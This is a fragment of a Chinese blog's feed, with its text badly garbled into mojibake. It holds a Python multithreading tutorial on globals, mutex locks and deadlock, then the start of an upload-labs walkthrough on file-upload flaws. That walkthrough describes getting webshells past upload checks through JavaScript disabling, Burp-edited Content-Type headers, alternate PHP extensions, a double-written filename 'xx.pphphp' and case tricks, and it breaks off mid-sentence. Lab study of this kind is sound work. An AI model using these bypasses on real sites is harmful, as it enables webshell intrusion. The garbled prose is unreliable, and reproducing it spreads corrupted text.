globalã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">num = <span class="number">100</span></span><br><span class="line">nums = [<span class="number">12</span>,<span class="number">13</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line"><span class="keyword">global</span> num</span><br><span class="line">num += <span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test1</span>():</span><br><span class="line">nums.append(<span class="number">13</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(num)</span><br><span class="line"><span class="built_in">print</span>(nums)</span><br><span class="line"></span><br><span class="line">test()</span><br><span class="line">test1()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(num)</span><br><span class="line"><span class="built_in">print</span>(nums)</span><br><span class="line"></span><br><span class="line">D:\python_workspace\multi_task&gt;py modify_global_var_in_func.py</span><br><span class="line"><span class="number">100</span></span><br><span class="line">[<span class="number">12</span>, <span class="number">13</span>]</span><br><span class="line"><span class="number">200</span></span><br><span class="line">[<span class="number">12</span>, <span class="number">13</span>, <span class="number">13</span>]</span><br></pre></td></tr></table></figure><p>ä¼ å‚æ–¹å¼éªŒè¯å¤šçº¿ç¨‹å…±äº«å…¨å±€å˜é‡</p><p>æ³¨æ„ï¼šargsè¦ä¼ ä¸€ä¸ªå…ƒç»„ï¼Œå¦‚æœå…ƒç¥–åªæœ‰ä¸€ä¸ªå‚æ•°ï¼Œé‚£ä¹ˆéœ€è¦åŠ ä¸ªé€—å·ï¼Œè¡¨æ˜å®ƒæ˜¯å…ƒç¥–ã€‚</p><p>å³ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">g_num = [<span class="number">1.2</span>]</span><br><span class="line">t1 = threading.Thread(target=test1, args=(g_num,))</span><br><span class="line"></span><br><span class="line">test = <span class="number">1</span></span><br><span class="line">t1 = threading.Thread(target=test1, args=(test,))</span><br></pre></td></tr></table></figure><p>ä¼ å‚æ—¶è¿™æ ·å†™ï¼Œå†™ä¸€ä¸ªæ‹¬å·ï¼Œæ‹¬å·å†…å†™ä¼ çš„å‚æ•°ç„¶åç”¨é€—å·éš”å¼€ï¼Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>((<span class="number">1</span>))</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;int&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>((<span class="number">1</span>,))</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;tuple&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><p>å…±äº«å…¨å±€å˜é‡çš„é—®é¢˜</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Python/multi_threading_basic.png" /></p><p>å…±äº«å…¨å±€å˜é‡ä¼šé€ æˆèµ„æºç«äº‰é—®é¢˜ï¼Œæ‰§è¡Œæ¬¡æ•°è¶Šå¤šå‡ºç°é”™è¯¯çš„å¯èƒ½æ€§è¶Šå¤§</p><h1 id="åŒæ­¥">åŒæ­¥</h1><p>åŒæ­¥å°±æ˜¯ååŒæ­¥è°ƒï¼ŒæŒ‰ç…§é¢„å®šçš„å…ˆåæ¬¡åºè¿›è¡Œè¿è¡Œã€‚</p><p>å¯¹äºå…±äº«å…¨å±€å˜é‡é€ æˆçš„èµ„æºç«äº‰çš„é—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡çº¿ç¨‹åŒæ­¥æ¥è§£å†³ï¼Œå³ï¼šåŠ é”ã€‚</p><h1 id="äº’æ–¥é”åŸå­æ€§">äº’æ–¥é”ï¼ˆåŸå­æ€§ï¼‰</h1><p>å½“å¤šä¸ªçº¿ç¨‹å‡ ä¹åŒæ—¶ä¿®æ”¹æŸä¸€ä¸ªå…±äº«æ•°æ®çš„æ—¶å€™ï¼ˆå³åŒæ—¶è¿›å…¥ä¸´ç•ŒåŒºæ—¶ï¼‰ï¼Œéœ€è¦è¿›è¡ŒåŒæ­¥æ§åˆ¶ã€‚</p><p>æŸä¸ªçº¿ç¨‹è¦æ›´æ”¹å…±äº«æ•°æ®æ—¶ï¼Œå…ˆå°†å…¶é”å®šã€‚æ­¤æ—¶ï¼Œèµ„æºçš„çŠ¶æ€ä¸ºâ€œé”å®šâ€ï¼Œå…¶ä»–çº¿ç¨‹ä¸èƒ½æ›´æ”¹ã€‚ç›´åˆ°è¯¥çº¿ç¨‹é‡Šæ”¾èµ„æºï¼Œå°†èµ„æºçŠ¶æ€å˜æˆâ€œéé”å®šâ€ã€‚å…¶ä»–çš„çº¿ç¨‹æ‰èƒ½å†æ¬¡é”å®šè¯¥èµ„æºã€‚äº’æ–¥é”ä¿è¯äº†æ¯æ¬¡åªæœ‰ä¸€ä¸ªçº¿ç¨‹è¿›è¡Œå†™å…¥æ“ä½œï¼Œä»è€Œä¿è¯äº†å¤šçº¿ç¨‹æƒ…å†µä¸‹æ•°æ®çš„æ­£ç¡®æ€§ã€‚</p><p>å¸¸è§ä¸´ç•ŒåŒºï¼š</p><ol type="1"><li>ä¿®æ”¹æŸäº›ä¸´ç•Œå˜é‡ç­‰</li><li>å¤šçº¿ç¨‹è¾“å‡ºï¼ˆå‘å±å¹•æˆ–è€…æ–‡ä»¶ï¼‰ï¼Œå®¹æ˜“é€ æˆç²˜è¿ã€‚</li></ol><h2 id="æ­¥éª¤">æ­¥éª¤</h2><h3 id="åˆ›å»ºé”">åˆ›å»ºé”</h3><p><code>mutex = threading.Lock()</code></p><h3 id="ä¸Šé”é”å®š">ä¸Šé”ï¼ˆé”å®šï¼‰</h3><p><code>mutex = acquire()</code></p><p>ä¸Šé”ï¼Œå¦‚æœä¹‹å‰æ²¡æœ‰è¢«ä¸Šé”ï¼Œé‚£ä¹ˆæ­¤æ—¶ä¸Šé”æˆåŠŸã€‚å¦‚æœä¸Šé”ä¹‹å‰å·²ç»è¢«ä¸Šé”äº†ï¼Œé‚£ä¹ˆæ­¤æ—¶ä¼šå µå¡åœ¨è¿™é‡Œï¼ŒçŸ¥é“è¿™ä¸ªé”è¢«è§£å¼€ã€‚</p><h3 id="é‡Šæ”¾é”èµ„æº">é‡Šæ”¾é”èµ„æº</h3><p><code>mutex.release()</code></p><p>ä¸Šé”æœ‰ä¸€ä¸ªåŸåˆ™ï¼šåœ¨å®ç°åŠŸèƒ½çš„å‰æä¸‹ï¼Œä¸Šé”çš„ä»£ç è¶Šå°‘è¶Šå¥½ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®šä¹‰ä¸€ä¸ªå…¨å±€å˜é‡</span></span><br><span class="line">g_num = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test1</span>(<span class="params">num</span>):</span><br><span class="line"><span class="keyword">global</span> g_num</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">mutex.acquire()</span><br><span class="line">g_num += <span class="number">1</span></span><br><span class="line">mutex.release()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;-----in test1 g_num=%d---&#x27;</span> % g_num)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test2</span>(<span class="params">num</span>):</span><br><span class="line"><span class="keyword">global</span> g_num</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">mutex.acquire()</span><br><span class="line">g_num += <span class="number">1</span></span><br><span class="line">mutex.release()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;-----in test2 g_num=%d---&#x27;</span> % g_num)</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºä¸€ä¸ªäº’æ–¥é”ï¼Œé»˜è®¤æ˜¯æ²¡æœ‰ä¸Šé”çš„</span></span><br><span class="line">mutex = threading.Lock()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">t1 = threading.Thread(target=test1,args=(<span class="number">10000</span>,))</span><br><span class="line">t2 = threading.Thread(target=test2,args=(<span class="number">10000</span>,))</span><br><span class="line"></span><br><span class="line">t1.start()</span><br><span class="line">t2.start()</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç­‰å¾…ä¸Šé¢çš„ä¸¤ä¸ªçº¿ç¨‹æ‰§è¡Œå®Œæ¯•</span></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„åŠ é”ï¼Œæœ‰ä¸¤ç§æ–¹å¼ï¼š</p><p>å°†é”åŠ åœ¨ for å¾ªç¯é‡Œé¢</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">mutex.acquire()</span><br><span class="line">g_num += <span class="number">1</span></span><br><span class="line">mutex.release()</span><br></pre></td></tr></table></figure><p>è¿™ç§æƒ…å†µä¸‹ï¼Œåªå¯¹ <code>g_num += 1</code>è¿›è¡ŒåŠ é”ï¼Œé‚£ä¹ˆå¤šä¸ªçº¿ç¨‹çš„æ¯æ¬¡å¾ªç¯å¯èƒ½äº¤å‰è¿è¡Œï¼Œæ¯”å¦‚ï¼šçº¿ç¨‹ä¸€è¿›è¡Œä¸€æ¬¡å¾ªç¯ï¼Œç„¶åçº¿æ€§äºŒæ‰§è¡Œä¸€æ¬¡å¾ªç¯ã€‚æ­¤æ–¹æ³•ï¼Œä¸ä¿è¯å•ä¸ªçº¿ç¨‹ç»“æœçš„å”¯ä¸€æ€§ä¸å‡†ç¡®æ€§ï¼Œåªä¿è¯å¤šä¸ªçº¿ç¨‹çš„æœ€åç»“æœçš„å”¯ä¸€æ€§ä¸å‡†ç¡®æ€§ã€‚</p><p>å°†é”åŠ åœ¨ for å¾ªç¯å¤–é¢</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mutex.acquire()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">g_num += <span class="number">1</span></span><br><span class="line">mutex.release()</span><br></pre></td></tr></table></figure><p>è¿™ç§æƒ…å†µä¸‹ï¼Œå¤šä¸ªçº¿ç¨‹çš„ for å¾ªç¯ä¸ä¼šäº¤å‰ã€‚åªæœ‰ä¸€ä¸ªçº¿ç¨‹çš„å…¨éƒ¨çš„ forå¾ªç¯æ‰§è¡Œå®Œæ¯•åï¼Œå¦ä¸€ä¸ªçº¿ç¨‹æ‰å¯ä»¥è·å¾—é”èµ„æºã€‚æ­¤æ–¹æ³•ï¼Œä¿è¯äº†æœ¬çº¿ç¨‹ç»“æœçš„å”¯ä¸€æ€§ä¸å‡†ç¡®æ€§ã€‚</p><h1 id="æ­»é”é—®é¢˜">æ­»é”é—®é¢˜</h1><p>æ­»é”é—®é¢˜è§£å†³å¤šä¸ªé”ç›¸äº’å†²çªçš„æƒ…å†µã€‚æ¯”å¦‚ï¼šçº¿ç¨‹ä¸€å¯¹ mutexAä¸Šé”ï¼Œçº¿ç¨‹äºŒå¯¹ mutexBä¸Šé”ï¼Œçº¿ç¨‹ä¸€ã€äºŒåœ¨å…¶ä¸Šçš„é”æœªé‡Šæ”¾çš„æƒ…å†µä¸‹ï¼Œåˆç”³è¯·å¯¹æ–¹çš„é”ï¼Œè¿™æ ·å°±ä¼šäº§ç”Ÿç›¸äº’ç­‰å¾…çš„æ­»é”é—®é¢˜ã€‚</p><p>é¿å…æ­»é”ï¼š</p><ol type="1"><li>ç¨‹åºè®¾è®¡æ—¶è¦å°½é‡é¿å…</li><li>æ·»åŠ è¶…æ—¶æ—¶é—´</li></ol><p>å‚è€ƒèµ„æ–™ï¼š</p><p><ahref="https://docs.python.org/3/library/threading.html">å®˜æ–¹æ‰‹å†Œ</a></p><p><a href="https://github.com/lhchen74/python-note">python-note</a></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ–‡ä»¶ä¸Šä¼ </title>
      <link href="/blog/2019/08/25/websec/file_upload/file_upload/"/>
      <url>/blog/2019/08/25/websec/file_upload/file_upload/</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/theLSA/upload-labs">upload-labsé¶åœº</a></p><h1 id="é¢„å¤‡çŸ¥è¯†">é¢„å¤‡çŸ¥è¯†</h1><h2 id="å‘ç°åŠåˆ©ç”¨">å‘ç°åŠåˆ©ç”¨</h2><p>ä¼šå‘˜æ³¨å†Œä¸Šä¼ åŠŸèƒ½ï¼Œæ‰«æå·¥å…·æ‰«å‡ºçš„ä¸Šä¼ ç‚¹ï¼Œåå°ç®¡ç†ç³»ç»Ÿä¸Šä¼ åŠŸèƒ½ç­‰ã€‚</p><h2 id="å±å®³">å±å®³</h2><p>æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ æ¼æ´è·å–å½“å‰ç½‘ç«™çš„æƒé™ï¼Œwebshell æƒé™ã€‚</p><h2 id="è¿‡æ»¤æ‰‹æ®µ">è¿‡æ»¤æ‰‹æ®µ</h2><p>æ–‡ä»¶ä¸Šä¼ æŒ‰ç…§å¯¹ä¸Šä¼ æ–‡ä»¶çš„åç¼€åçš„é™åˆ¶åˆ†ä¸ºï¼šé»‘åå•è¿‡æ»¤ä¸ç™½åå•è¿‡æ»¤ã€‚</p><h2 id="åˆ¤æ–­æœ¨é©¬æ˜¯å¦è§£æ">åˆ¤æ–­æœ¨é©¬æ˜¯å¦è§£æ</h2><p>å¦‚æœæ˜¯ä¸€å¥è¯çš„è¯</p><p>æ‰¾åˆ°å›¾ç‰‡çš„åœ°å€è®¿é—®å®ƒï¼ˆä¸€èˆ¬æ˜¯ï¼Œå³é”®æ–°æ ‡ç­¾é¡µæ‰“å¼€å›¾ç‰‡ç½‘å€ï¼‰ï¼Œçœ‹çœ‹ç½‘é¡µå†…å®¹ï¼Œ</p><ol type="1"><li><p>ä¼ çš„åªæœ‰ä»£ç ï¼Œ</p><p>å¦‚æœåŸåŸæœ¬æœ¬åœ°æŠŠä½ çš„æ–‡ä»¶å†…å®¹æ˜¾ç¤ºå‡ºæ¥é‚£æ˜¯å½“åšæ–‡æœ¬è§£æäº†ï¼Œå¤±è´¥ã€‚å¦‚æœæ˜¯ç©ºç™½ï¼Œé‚£å°±å¥½äº†ï¼Œè¯´æ˜å½“åšä»£ç è§£æäº†ã€‚</p></li><li><p>ä¼ çš„æ˜¯å›¾ç‰‡é©¬</p><p>åªè¦ä¸æ­£å¸¸æ˜¾ç¤ºå›¾ç‰‡ï¼Œæ˜¾ç¤ºå›¾ç‰‡ä¹±ç å•¥çš„ï¼Œå°±å¯ä»¥è®¤ä¸ºæ­£å¸¸è§£æäº†ã€‚</p></li></ol><p>å½“ç„¶ï¼Œæˆ‘ä»¬å†ç”¨ Cknife æˆ–ä¸­å›½èšå‰‘å»è¿æ¥è¯•è¯•å°±è¡Œäº†ã€‚</p><p>å¦‚æœæ˜¯ç”± Web å›¾å½¢ç•Œé¢çš„å¤§é©¬</p><p>ç›´æ¥çœ‹å›¾å½¢ç•Œé¢æ˜¾ç¤ºæ²¡æœ‰å°±è¡Œäº†ã€‚</p><h1 id="å‰ç«¯-javascript-é™åˆ¶">å‰ç«¯ Javascript é™åˆ¶</h1><p>å‰ç«¯ JS é™åˆ¶ä¸Šä¼ æ–‡ä»¶çš„åç¼€åï¼Œå¸¸ç”¨ç»•è¿‡æ–¹æ³•ï¼š</p><ol type="1"><li>æµè§ˆå™¨ç¦ç”¨ Javascript</li><li>å…ˆä¸Šä¼ æ”¹ä¸ºå›¾ç‰‡åç¼€çš„ä»£ç æ–‡ä»¶ï¼Œç„¶å Burpä»£ç†æŠ“åŒ…ï¼Œæ”¹åç¼€åä¸ºå¯¹åº”å¯è§£æä»£ç çš„åç¼€åã€‚</li><li>ä¿®æ”¹æˆ–åˆ å‡ Javascript ä»£ç </li></ol><p>æ³¨æ„ï¼šåŒºåˆ†å‰ç«¯ä¸åç«¯é™åˆ¶ï¼š</p><ol type="1"><li><p>åç«¯é™åˆ¶ä¸€èˆ¬ä¸ºé¡µé¢å›æ˜¾çš„æ–‡å­—æç¤ºã€‚JSå‰ç«¯é™åˆ¶ä¸€èˆ¬ä¸ºå¼¹çª—æç¤ºï¼ˆä¸ä»…ä»…å±€é™äºæ–‡ä»¶ä¸Šä¼ ï¼‰ã€‚</p><p>å¦‚æœä»€ä¹ˆæ—¶å€™ï¼Œä½ çœ‹åˆ°æµè§ˆå™¨å¼¹çª—ï¼Œå°±è¦çŸ¥é“è¿™æ˜¯å‰ç«¯ JS ä»£ç çš„æ“ä½œï¼Œç¦ç”¨JS æˆ– æŠ“åŒ…ç»•è¿‡ï¼Œè¿™ä¸¤ç§æ–¹æ³•å°±è¦æµ®ç°åœ¨çœ¼å‰ã€‚æ­¤å¤–ï¼Œå¦‚æœæ˜¯å‰ç«¯é™åˆ¶ï¼Œåœ¨chrome Dev tools çš„ Elements ä¸­ï¼ŒCtrl + Fï¼Œä¾¿å¯ä»¥æœåˆ°æç¤ºæ–‡å­—ã€‚</p></li><li><p>å‰ç«¯é™åˆ¶ä¸éœ€è¦æœåŠ¡å™¨å‘åŒ…ï¼Œä¸ä¼šåˆ·æ–°é¡µé¢ã€‚åç«¯é™åˆ¶è¦å‘æœåŠ¡å™¨å‘åŒ…ä¹‹åï¼Œä¼šåˆ·æ–°é¡µé¢</p></li></ol><p>å®ä¾‹</p><p>upload labs ç¬¬ä¸€å…³</p><h1 id="åç«¯-mime_types-ç™½åå•">åç«¯ MIME_types ç™½åå•</h1><p>å¦‚æœæ˜¯ä¸Šä¼ å›¾ç‰‡çš„è¯ï¼Œå°±åªä¼šå…è®¸ image/jpegã€image/gif image/pngç­‰å›¾ç‰‡ç›¸å…³çš„ MIME TYPE ä¸Šä¼ ã€‚</p><blockquote><p><strong>åª’ä½“ç±»å‹</strong>ï¼ˆé€šå¸¸ç§°ä¸º <strong>Multipurpose InternetMail Extensions</strong> æˆ– <strong>MIME</strong> ç±»å‹ï¼‰æ˜¯ä¸€ç§æ ‡å‡†ï¼Œç”¨æ¥è¡¨ç¤ºæ–‡æ¡£ã€æ–‡ä»¶æˆ–å­—èŠ‚æµçš„æ€§è´¨å’Œæ ¼å¼é‡è¦ï¼š**æµè§ˆå™¨é€šå¸¸ä½¿ç”¨MIME ç±»å‹ï¼ˆè€Œä¸æ˜¯æ–‡ä»¶æ‰©å±•åï¼‰æ¥ç¡®å®šå¦‚ä½•å¤„ç† URLï¼Œå› æ­¤ WebæœåŠ¡å™¨åœ¨å“åº”å¤´ä¸­æ·»åŠ æ­£ç¡®çš„ MIMEç±»å‹éå¸¸é‡è¦ã€‚å¦‚æœé…ç½®ä¸æ­£ç¡®ï¼Œæµè§ˆå™¨å¯èƒ½ä¼šæ›²è§£æ–‡ä»¶å†…å®¹ï¼Œç½‘ç«™å°†æ— æ³•æ­£å¸¸å·¥ä½œï¼Œå¹¶ä¸”ä¸‹è½½çš„æ–‡ä»¶ä¹Ÿä¼šè¢«é”™è¯¯å¤„ç†ã€‚</p></blockquote><p>æ‘˜è‡ªï¼š<ahref="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types">MIMEç±»å‹</a></p><p>å®ƒä½äº HTTP header çš„ <strong>Content</strong>-<strong>Type</strong>å­—æ®µã€‚</p><p><ahref="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types/Complete_list_of_MIME_types">å¸¸è§MIME ç±»å‹åˆ—è¡¨</a></p><p>å¸¸è§çš„ç±»å‹ï¼š</p><ul><li><p>jpg ä¸ jpeg éƒ½æ˜¯ image/jpeg ç±»å‹</p></li><li><p>gif æ˜¯ image/gif ç±»å‹ï¼Œpng æ˜¯ image/png ç±»å‹ã€‚</p></li><li><p><code>text/plain</code>è¡¨ç¤ºæ–‡æœ¬æ–‡ä»¶çš„é»˜è®¤å€¼ã€‚ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶åº”å½“æ˜¯äººç±»å¯è¯»çš„ï¼Œå¹¶ä¸”ä¸åŒ…å«äºŒè¿›åˆ¶æ•°æ®ã€‚</p></li><li><p><code>application/octet-stream</code>è¡¨ç¤ºæ‰€æœ‰å…¶ä»–æƒ…å†µçš„é»˜è®¤å€¼ã€‚ä¸€ç§æœªçŸ¥çš„æ–‡ä»¶ç±»å‹åº”å½“ä½¿ç”¨æ­¤ç±»å‹ã€‚æµè§ˆå™¨åœ¨å¤„ç†è¿™äº›æ–‡ä»¶æ—¶ä¼šç‰¹åˆ«å°å¿ƒ,è¯•å›¾é˜²æ­¢ã€é¿å…ç”¨æˆ·çš„å±é™©è¡Œä¸º.</p></li></ul><p>å¦‚ä½•ç¡®å®šåç«¯åœ¨æŸäº› HTTP å¤´ä¸Šçš„é™åˆ¶ï¼ˆè¿™é‡Œå°±æ˜¯ï¼šMIME TYPE é™åˆ¶ï¼‰</p><p>è¿™é‡Œè®²ä¸€ä¸ªé€šç”¨çš„æ–¹æ³•ï¼Œå½“ç„¶ï¼Œå¦‚æœåªæ˜¯çœ‹ MIME-TYPESä¸ç”¨è¿™ä¹ˆéº»çƒ¦ï¼Œç›´æ¥çœ‹å°±è¡Œå•¦ã€‚</p><p>ä¸Šä¼ æ­£å¸¸åç¼€å›¾ç‰‡æ–‡ä»¶ï¼ŒæŠ“åŒ…å‘é€åˆ° comparerï¼ŒåŒæ ·çš„ä¸Šä¼  phpåç¼€ä»£ç æ–‡ä»¶ï¼ŒæŠ“åŒ…å‘é€åˆ° comparerã€‚äºŒè€…å¯¹æ¯”ï¼Œçœ‹çœ‹ headerå¤´æœ‰å“ªäº›ä¸ä¸€æ ·çš„åœ°æ–¹ã€‚å½“ç„¶ï¼Œæˆ‘ä»¬è¿™é‡Œéœ€è¦åˆ¤æ–­ Content-type å­—æ®µï¼Œé‚£å°±çœ‹content-type æ˜¯å¦ä¸€æ ·ï¼Œç”šè‡³å¯ä»¥å» Repeater å‘åŒ…éªŒè¯æ˜¯ä¸æ˜¯ MIME-TYPESé™åˆ¶ï¼Œå¦‚æœæ˜¯çš„è¯ï¼Œæˆ‘ä»¬ä¸Šä¼  php æ–‡ä»¶ï¼ŒæŠ“åŒ…æ”¹æ‰ content-typeå°±å¯ä»¥äº†ã€‚</p><h1 id="åç«¯åç¼€åé»‘åå•">åç«¯åç¼€åé»‘åå•</h1><p>å¦‚æœæ˜¯æŸäº›ä»£ç åç¼€åæˆ–é…ç½®æ–‡ä»¶åç¼€åï¼Œä¾¿ç¦æ­¢ä¸Šä¼ ã€‚</p><p>ç»•è¿‡æ–¹å¼ï¼š</p><h2 id="é»‘åå•ä¸å…¨">é»‘åå•ä¸å…¨</h2><p>è¿‡æ»¤çš„åç¼€åä¸å…¨</p><p>å°è¯• Web ä¸­é—´ä»¶ï¼ˆApacheï¼ŒIISï¼ŒNginxç­‰ï¼‰å…¶ä»–çš„å¯ä»¥è§£æçš„ä½†æ˜¯é»‘åå•æ²¡æœ‰è¿‡æ»¤çš„åç¼€åã€‚é€‚ç”¨äºé»‘åå•ä¸å…¨çš„æƒ…å†µï¼Œè¦æ˜¯é»‘åå•æ¯”è¾ƒå…¨ï¼Œé‚£è¿™ä¸ªæ–¹å¼å°±ä¸å¥½ä½¿äº†ã€‚</p><p>å¯¹ Apache ä¸ PHP æ¥è¯´ï¼ˆå…¶ä»–çš„æ€è·¯å¤§è‡´ä¸€æ ·ï¼‰</p><p>Apache PHPå¸¸è§çš„æœ‰ï¼šphp3ï¼Œphp4ï¼Œphp5ï¼Œphp6ï¼Œphtmlï¼Œphpsï¼Œphtï¼Œä½†æ˜¯è¦æƒ³è®© Apacheè§£æå‰ææ˜¯ä¸‹é¢å°†çš„é…ç½®æ–‡ä»¶ä¸­é…ç½®äº†å®ƒã€‚</p><p>ç†è®ºåŸºç¡€ï¼š</p><p>é¦–å…ˆåœ¨ Apache å’Œ PHP ä»¥ Module çš„<ahref="https://blog.csdn.net/sinat_22991367/article/details/73431316">æ–¹å¼ç»“åˆ</a>çš„æƒ…å†µä¸‹ï¼ˆæˆ‘ä»¬ä¸€ä¸ªä¸ªç ”å‹ç¼©åŒ…å®‰è£…çš„ï¼Œå°±æ˜¯Module æ–¹å¼ç»“åˆï¼Œå…¶ä»–çš„è¿˜æ²¡äº†è§£è¿‡ emmï¼‰ï¼Œè‡ªå·±é…ç½®è¿‡ç¯å¢ƒçš„éƒ½çŸ¥é“ï¼Œåœ¨Apache çš„ conf/httpd.conf é…ç½®æ–‡ä»¶ä¸­ï¼Œæˆ‘ä»¬éœ€è¦åŠ è½½ PHP çš„ä¸€äº›æ¨¡å—ã€é…ç½®PHP è·¯å¾„ï¼Œå¹¶ä¸”éœ€è¦é…ç½®æ·»åŠ  Apache è¦æŠŠå“ªäº›åç¼€åçš„æ–‡ä»¶äº¤ç»™ PHPè§£æã€‚</p><p>è€Œä¸‹é¢è¿™è¯­å¥å°±æ˜¯</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .php .php3 .phtml</span><br></pre></td></tr></table></figure><p>è¿™é‡Œé¢çš„åç¼€åå°±æ˜¯æ­£å¸¸æƒ…å†µä¸‹ï¼ŒApacheå¯ä»¥è§£æçš„åç¼€åï¼Œå¦‚æœé»‘åå•å±è”½ä¸å…¨çš„è¯ï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥ä½¿ç”¨å…¶ä¸­ä¹‹ä¸€ç»•è¿‡ï¼Œå¦‚æœéƒ½å±è”½äº†ï¼Œé‚£è¿™ä¸ªæ–¹æ³•å°±å‡‰äº†ã€‚</p><p>è¿‡æ»¤é€»è¾‘æœ‰é—®é¢˜</p><p>å¯¹äºæœ‰çš„é»‘åå•è¿‡æ»¤ï¼Œåªè¿‡æ»¤ä¸€æ¬¡åç¼€ phpçš„ï¼Œå¯ä»¥é‡‡ç”¨åŒå†™æ–‡ä»¶åç»•è¿‡ï¼Œæ–‡ä»¶åæ”¹æˆ<code>xx.pphphp</code></p><p>å®ä¾‹ï¼šupload lab Pass 10</p><h2 id="æ“ä½œç³»ç»Ÿç‰¹æ€§">æ“ä½œç³»ç»Ÿç‰¹æ€§</h2><p>windows ç³»ç»Ÿä¸‹</p><ol type="1"><li><p>åœ¨ Linux æ²¡æœ‰ç‰¹æ®Šé…ç½®çš„æƒ…å†µä¸‹ï¼Œè¿™ç§æƒ…å†µåªæœ‰ Windows å¯ä»¥ï¼Œå› ä¸ºWindows ä¼šå¿½ç•¥å¤§å°å†™ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å°è¯•å¤§å°å†™ç»•è¿‡ã€‚å½“ç„¶ï¼Œå› ä¸º linuxç¯å¢ƒä¸‹ï¼Œè·¯å¾„æ˜¯åŒºåˆ†å¤§å°å†™çš„ï¼Œåœ¨ apache éƒ¨ç½²ä¸‹çš„ webåº”ç”¨ï¼Œæœ‰æ—¶å€™å‡ºç°å¤§å°å†™ä¸åŒ¹é…å¯¼è‡´æ— æ³•è®¿é—®ã€‚æˆ‘ä»¬ä¹Ÿå¯ä»¥é…ç½® 